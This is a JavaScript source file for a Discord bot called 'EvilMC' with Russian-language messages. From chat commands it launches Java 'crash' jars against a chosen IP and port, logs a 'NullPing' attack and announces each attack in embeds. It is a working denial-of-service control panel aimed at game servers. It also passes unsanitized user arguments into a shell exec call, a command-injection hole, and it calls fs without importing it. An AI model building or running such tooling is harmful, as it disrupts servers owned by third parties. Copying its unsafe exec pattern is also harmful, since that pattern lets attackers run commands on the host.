const Event = require('../structure/event.js');
const config = require('../jsons/config.json');
const Discord = require('discord.js');
const whitelist = require('../jsons/whitelist.json').whitelistid;
const { exec } = require('child_process');
const attack = require('../jsons/attacks.json');


module.exports = new Event('messageCreate', (client, message) => {
    if (!message.content.startsWith(client.prefix)) return;

    const args = message.content.substring(client.prefix.length).split(/ +/)
    const command = client.commands.find(cmd => cmd.name == args[0])

    global.errorembed = function errorembed(text) {
        let errembed = new Discord.MessageEmbed()
            .setColor('RED')
            .setAuthor(message.author.tag, message.author.displayAvatarURL({ dynamic: true }))
            .addField("Команда:", `${config.prefix + command.name}`, false)
            .addField("Причина:", `${text}`, false)
            .setFooter(`${message.guild.name} | EvilMC`, client.user.avatarURL('jpg'))
        message.channel.send({ embeds: [errembed] })
    }

    if (config.attackchannelmode.enable === true && message.channel.id != config.attackchannelmode.channelid) return errorembed("Активироан режим одного канала.")

    /**
     * 
     * @param {String} method 
     * @param {String} iphost 
     * @param {String} port 
     * @param {Boolean} timeout 
     */
    global.runcrash = function runcrash(method, iphost, port, timeout) {
        let runembedtime = new Discord.MessageEmbed()
            .setColor('RANDOM')
            .setAuthor(message.author.tag, message.author.displayAvatarURL({ dynamic: true }))
            .setDescription(`**► Метод: ${method}** \n \n **► Информация** \n IP: ${iphost} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!! 🕒 \n ☆ Made with ♥ by DesConnet ☆`)
            .setFooter(`${message.guild.name} | EvilMC`, client.user.avatarURL('jpg'))

        let runembed = new Discord.MessageEmbed()
            .setColor('RANDOM')
            .setAuthor(message.author.tag, message.author.displayAvatarURL({ dynamic: true }))
            .setDescription(`**► Метод: ${method}** \n \n **► Информация** \n IP: ${iphost} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► Для остановки введите ;stop\n ☆ Made with ♥ by DesConnet ☆`)
            .setFooter(`${message.guild.name} | EvilMC`, client.user.avatarURL('jpg'))

        let endembed = new Discord.MessageEmbed()
            .setColor('RANDOM')
            .setAuthor(message.author.tag, message.author.displayAvatarURL({ dynamic: true }))
            .setDescription(`**► Метод: ${method}** \n \n **► Информация** \n IP: ${iphost} \n Port: ${port} \n \n ► Атака Завершена!\n ☆ Made with ♥ by DesConnet ☆`)
            .setFooter(`${message.guild.name} | EvilMC`, client.user.avatarURL('jpg'))

        if(timeout == true){
            message.channel.send({ embeds: [runembedtime] }).then(msg => {
                setTimeout(function () {
                    msg.edit({ embeds: [endembed] });
                    attack.run = false;
                    fs.writeFile('../jsons/attacks.json', JSON.stringify(attack)).catch(err => {
                        return errorembed("Ошибка записи в файл (Пожалйста обратитесь к DesConnet)")
                    })
                }, 60000)
            });
        }else{ 
            message.channel.send({ embeds: [runembed] })
            attack.run = false;
            fs.writeFile('../jsons/attacks.json', JSON.stringify(attack)).catch(err => {
                return errorembed("Ошибка записи в файл (Пожалйста обратитесь к DesConnet)")
            })
        }
    }

    /**
     * 
     * @param {String} jar 
     * @param {String}} args 
     * @param {Boolean} timeout 
     */
    global.runjar = function runjar(jar, args, timeout) {
        if (timeout == true) {
            attack.run = true;
            fs.writeFile('../jsons/attacks.json', JSON.stringify(attack)).catch(err => {
                return errorembed("Ошибка записи в файл (Пожалйста обратитесь к DesConnet)")
                console.log(err)
            })
            exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar jars/${jar} ${args}`, (error, stdout, stderr) => {
                if (error) {
                    console.log(`Ошибка: ${error}`);
                    return;
                }
                if (stderr) {
                    console.log(`StdErr: ${stderr}`);
                    return;
                }
                console.log(`Была запущена атака: NullPing`)
                console.log(`[Attack log] ${stdout}`);
            })
        } else {
            attack.run = true;
            fs.writeFile('../jsons/attacks.json', JSON.stringify(attack)).catch(err => {
                return errorembed("Ошибка записи в файл (Пожалйста обратитесь к DesConnet)")
                console.log(err)
            })
            exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar jars/${jar} ${args}`, (error, stdout, stderr) => {
                if (error) {
                    console.log(`Ошибка: ${error}`);
                    return;
                }
                if (stderr) {
                    console.log(`StdErr: ${stderr}`);
                    return;
                }
                console.log(`Была запущена атака: NullPing`)
                console.log(`[Attack log] ${stdout}`);
            })
        }
    }

    if (!command) return;

    if (config.whitelistmode === true && !whitelist.includes(message.author.id)) return errorembed("Вы не находитесь в Вайтлисте!");

    const permission = message.member.permissions.has(command.permissions);
    if (!permission) return errorembed(`Отсутвует разрешение: \`${permission}\` для выполнения данной команды`);
    if (attack.run === true) return errorembed('В данный момент уже запущена атака, пожалуйста подождите пока атака завершится');

    command.execute(client, args, message);
})